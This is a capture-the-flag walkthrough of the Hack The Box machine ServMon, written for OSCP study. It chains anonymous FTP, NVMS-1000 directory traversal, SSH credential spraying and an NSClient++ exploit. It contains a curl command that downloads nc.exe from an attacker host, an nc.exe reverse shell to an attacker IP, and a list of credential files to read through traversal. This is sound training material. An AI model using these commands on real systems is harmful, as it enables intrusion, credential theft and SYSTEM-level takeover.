# ServMon — HTB (TJ Null OSCP List)

| Detail       | Value                          |
|--------------|--------------------------------|
| **IP**       | 10.129.227.77                  |
| **OS**       | Windows                        |
| **Difficulty** | Easy                         |
| **Key Skills** | Directory traversal, Anonymous FTP, Credential spraying, SSH tunneling, NSClient++ privesc |

---

## 1. Enumeration

### Nmap — Key Ports
```
PORT      SERVICE         NOTES
21/tcp    FTP             Microsoft ftpd — Anonymous login allowed
22/tcp    SSH             OpenSSH for Windows 8.0
80/tcp    HTTP            NVMS-1000 (surveillance DVR web UI)
135/tcp   MSRPC           Windows RPC
139/tcp   NetBIOS
445/tcp   SMB
5666/tcp  tcpwrapped      (NRPE / Nagios agent)
8443/tcp  HTTPS           NSClient++ monitoring agent
```

### Key Observations
- **FTP allows anonymous access** — `Users/` directory visible with two user folders: `Nadine` and `Nathan`
- **Port 80** redirects to `/Pages/login.htm` — reveals **NVMS-1000** (network video monitoring software)
- **Port 8443** runs **NSClient++** — a Windows monitoring agent with a web interface

---

## 2. Information Gathering — FTP + Directory Traversal

### Anonymous FTP Enumeration
```bash
ftp 10.129.227.77
# Login: anonymous / (blank)

cd Users
ls
# Nadine/
# Nathan/

cd Nadine
get Confidential.txt
```

Contents of `Confidential.txt`:
```
Nathan,
I left your Passwords.txt file on your Desktop.
Please remove this once you have edited it yourself
and place it back into the secure folder.
Regards
```

> **OSCP Technique — Anonymous FTP:**
> Always try `anonymous` login on FTP (code 230 = success). Enumerate every directory — user home folders often contain notes, configs, or credentials. Download everything.

### NVMS-1000 Directory Traversal
NVMS-1000 is vulnerable to a **directory traversal** attack that lets you read arbitrary files on the system.

```bash
# Confirm the vulnerability
python3 nvms.py 10.129.227.77 Windows/system.ini

# Use the hint from Confidential.txt to grab Nathan's passwords
python3 nvms.py 10.129.227.77 Users/Nathan/Desktop/Passwords.txt
```

Retrieved a list of passwords from Nathan's Desktop.

> **OSCP Technique — Chaining findings:**
> FTP gave us usernames + a hint about a password file location. Directory traversal gave us the ability to read arbitrary files. Together: we know exactly what file to read. Always connect findings across services — one service tells you *what* to look for, another lets you *get* it.

---

## 3. Initial Foothold — Credential Spraying via SSH

### Build wordlists from what we found
- **Users:** `Nadine`, `Nathan` (from FTP)
- **Passwords:** the list retrieved via directory traversal

### Spray with NetExec
```bash
nxc ssh 10.129.227.77 -u users.txt -p passwords.txt
```

Result: **Nadine** authenticates successfully with one of the passwords.

```bash
ssh Nadine@10.129.227.77
```

> **OSCP Technique — Credential spraying:**
> When you have a username list and password list, spray across all services (SSH, SMB, WinRM, RDP, web logins). Tools:
> ```bash
> # SSH
> nxc ssh <IP> -u users.txt -p passwords.txt
> # SMB
> nxc smb <IP> -u users.txt -p passwords.txt
> # WinRM
> nxc winrm <IP> -u users.txt -p passwords.txt
> # Hydra (general)
> hydra -L users.txt -P passwords.txt ssh://<IP>
> ```
> Test every user/password combination — passwords are often reused across accounts.

**Shell as:** `Nadine`

---

## 4. Privilege Escalation — NSClient++ Exploit

### Step 1: Identify the target service
From nmap and WinPEAS, **NSClient++** is running on port 8443 but only listening on `127.0.0.1` (localhost). We can't reach it directly from our attacker machine.

### Step 2: SSH port forwarding
```bash
ssh -L 8443:127.0.0.1:8443 Nadine@10.129.227.77
```
Now `https://127.0.0.1:8443` on our attacker box tunnels to the target's NSClient++.

> **OSCP Technique — SSH local port forwarding:**
> When a service binds to `127.0.0.1` (localhost only), forward it through SSH:
> ```bash
> ssh -L <local_port>:127.0.0.1:<remote_port> user@target
> ```
> This is essential for exploiting internal-only services. Common candidates:
> - Web admin panels (like NSClient++)
> - Databases (MySQL 3306, PostgreSQL 5432)
> - Management interfaces
> - Development servers

### Step 3: Recover the NSClient++ admin password
The login page has a "Forgot Password" hint:
```
The NSClient++ password can be found by running:
nscp web -- password --display
```

```cmd
C:\Program Files\NSClient++> nscp.exe web -- password --display
Current password: <NSCLIENT_PASSWORD>
```

### Step 4: Identify the vulnerable version
```cmd
nscp.exe --version
# NSClient++, Version: 0.5.2.35 2018-01-28, Platform: x64
```
**NSClient++ 0.5.2.35** has a known **privilege escalation / RCE exploit** — it allows authenticated users to execute commands as SYSTEM via the API.

### Step 5: Upload nc.exe and exploit
```cmd
:: On the target, create a writable directory
mkdir C:\Temp

:: Transfer nc.exe from attacker (via Python HTTP server)
:: On attacker: python3 -m http.server 8080
:: On target:
cd C:\Temp
curl http://<ATTACKER_IP>:8080/nc.exe -o nc.exe
```

### Step 6: Run the exploit
```bash
# On attacker — start listener
nc -lvnp 9002

# Run NSClient++ exploit through the SSH tunnel
python exploitt.py -t 127.0.0.1 -P 8443 -p <NSCLIENT_PASSWORD> \
  -c "C:\Temp\nc.exe <ATTACKER_IP> 9002 -e cmd.exe"
```

> **OSCP Technique — NSClient++ exploitation pattern:**
> 1. Port-forward 8443 via SSH (it binds localhost)
> 2. Recover password: `nscp web -- password --display`
> 3. Upload `nc.exe` to a writable path (`C:\Temp\`)
> 4. Use the authenticated API/exploit to run `nc.exe` as SYSTEM
>
> This is a common pattern: **port forward** → **recover creds** → **authenticated RCE as SYSTEM**.

**Shell as:** `NT AUTHORITY\SYSTEM`

---

## 5. Attack Chain Summary

```
Anonymous FTP
    |
    v
Usernames (Nadine, Nathan) + Confidential.txt hint
    |
    v
NVMS-1000 Directory Traversal --> Passwords.txt from Nathan's Desktop
    |
    v
Credential Spray (nxc ssh) --> Nadine's SSH access
    |
    v
SSH port forward 8443 --> NSClient++ web UI (localhost only)
    |
    v
nscp.exe password --display --> admin password
    |
    v
NSClient++ 0.5.2.35 RCE exploit --> SYSTEM shell
```

---

## 6. OSCP Exam Takeaways

| Lesson | Detail |
|--------|--------|
| **Always try anonymous FTP** | Enumerate all directories for usernames, notes, and credential hints |
| **Chain findings across services** | FTP gave the "what" (file path), directory traversal gave the "how" (file read) |
| **Directory traversal = file read** | Use it to grab known Windows files: `SAM`, `SYSTEM`, `Passwords.txt`, `web.config`, `unattend.xml` |
| **Credential spray every service** | Got users + passwords? Spray SSH, SMB, WinRM, RDP, web logins |
| **Internal services need tunneling** | If a port binds `127.0.0.1`, SSH local forward (`-L`) to reach it |
| **Check installed software versions** | `nscp.exe --version` led directly to a known privesc exploit |
| **"Forgot password" hints are real** | The web UI literally told us how to recover the password |

---

## 7. Commands Quick Reference

```bash
# Anonymous FTP
ftp <IP>  # login: anonymous / (blank)
ls; cd Users; get Confidential.txt

# NVMS-1000 directory traversal
python3 nvms.py <IP> Windows/system.ini
python3 nvms.py <IP> Users/Nathan/Desktop/Passwords.txt

# Credential spray
nxc ssh <IP> -u users.txt -p passwords.txt

# SSH local port forward
ssh -L 8443:127.0.0.1:8443 Nadine@<IP>

# NSClient++ password recovery
nscp.exe web -- password --display

# NSClient++ exploit
python exploitt.py -t 127.0.0.1 -P 8443 -p <PASSWORD> \
  -c "C:\Temp\nc.exe ATTACKER 9002 -e cmd.exe"
```

---

## 8. Windows Files Worth Reading via Directory Traversal

| File | Why |
|------|-----|
| `Windows/system.ini` | Confirm traversal works (always exists) |
| `Users/<user>/Desktop/*.txt` | Notes, passwords, flags |
| `Windows/System32/config/SAM` | Password hashes (often locked) |
| `inetpub/wwwroot/web.config` | DB connection strings, app secrets |
| `Windows/Panther/unattend.xml` | Auto-install passwords |
| `Program Files/*/config*` | Application configs with creds |
